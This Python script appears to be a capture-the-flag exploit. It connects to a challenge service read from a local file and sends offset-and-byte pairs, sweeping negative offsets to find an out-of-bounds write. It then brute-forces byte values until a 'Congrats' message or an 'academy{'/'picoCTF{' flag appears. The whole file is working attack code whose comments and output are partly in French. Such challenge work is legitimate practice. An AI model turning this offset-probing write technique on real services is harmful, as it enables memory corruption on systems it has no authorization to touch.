import sys, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = open(r"./_z_146url.txt").read().split()
port = int(port)
print("cible:", host, port, flush=True)


def attempt(offset, value, wait=1.2):
    try:
        s = socket.create_connection((host, port), timeout=6)
        s.settimeout(wait)
    except Exception:
        return None
    try:
        s.sendall(str(offset).encode() + b"\n" + bytes([value]))
        out = b""
        t0 = time.time()
        while time.time() - t0 < wait:
            try:
                c = s.recv(4096)
                if not c:
                    break
                out += c
                if b"Welcome to my stream" in out:
                    break
            except socket.timeout:
                break
        return out.decode("latin-1", "replace")
    except Exception:
        return None
    finally:
        s.close()


def shown(r):
    if not r:
        return None
    if "Value: " not in r:
        return None
    seg = r.split("Value: ", 1)[1]
    seg = seg.split("Welcome to my stream", 1)[0]
    return seg.strip()


base = attempt(0, ord("A"))
print("temoin -> %r" % shown(base), flush=True)
t0 = time.time()
hits = []
for off in range(-4400, -5601, -16):
    r = attempt(off, 0x00)
    seg = shown(r)
    if seg is None:
        continue
    if "random string" not in seg:
        hits.append((off, seg))
        print("HIT %d -> %r" % (off, seg[:100]), flush=True)
        if len(hits) >= 2:
            break
print("phase1: %d hits, %.0fs" % (len(hits), time.time() - t0), flush=True)
if hits:
    off = hits[0][0]
    for v in range(0, 256, 16):
        r = attempt(off, v)
        seg = shown(r) or ""
        ok = ("Congrats" in seg) or ("academy{" in seg)
        print("  off=%d val=0x%02x -> %r %s" % (off, v, seg[:90], "OK" if ok else ""), flush=True)
        if ok:
            m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", seg)
            print("FLAG:", m.group(0) if m else None)
            break
